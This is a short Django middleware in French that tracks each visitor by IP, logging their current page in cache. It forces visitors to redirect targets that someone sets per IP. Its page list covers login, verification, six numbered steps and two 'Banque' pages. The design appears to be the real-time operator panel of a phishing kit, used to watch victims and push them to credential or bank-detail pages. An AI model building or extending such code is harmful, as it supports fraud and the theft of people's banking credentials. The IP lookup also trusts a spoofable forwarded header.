import time
from django.core.cache import cache

TIMEOUT_VISITEUR = 60
PAGES_DISPONIBLES = [
    ('/',              'Inscription / Connexion'),
    ('/verification/', 'Vérification'),
    ('/etape-1/',      'Étape 1'),
    ('/etape-2/',      'Étape 2'),
    ('/etape-3/',      'Étape 3'),
    ('/etape-4/',      'Étape 4'),
    ('/etape-5/',      'Étape 5'),
    ('/etape-6/',      'Étape 6'),
    ('/banque-1/',     'Banque 1'),
    ('/banque-2/',     'Banque 2'),
]


class VisiteurTempsReelMiddleware:

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        ip = self._get_ip(request)

        if not request.path.startswith('/visiteurs/'):
            # Vérifier redirection en cache
            cible = cache.get(f'redirect_{ip}')
            if cible:
                cache.delete(f'redirect_{ip}')
                from django.shortcuts import redirect
                return redirect(cible)

            # Enregistrer visiteur en cache
            cache.set(f'visiteur_{ip}', {
                'page':       request.path,
                'last_seen':  time.time(),
                'user_agent': request.META.get('HTTP_USER_AGENT', 'Inconnu'),
                'methode':    request.method,
            }, timeout=TIMEOUT_VISITEUR)

        response = self.get_response(request)
        return response

    def _get_ip(self, request):
        x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded:
            ip = x_forwarded.split(',')[0].strip()
        else:
            ip = request.META.get('REMOTE_ADDR', '0.0.0.0')
        if ip == '::1':
            ip = '127.0.0.1'
        return ip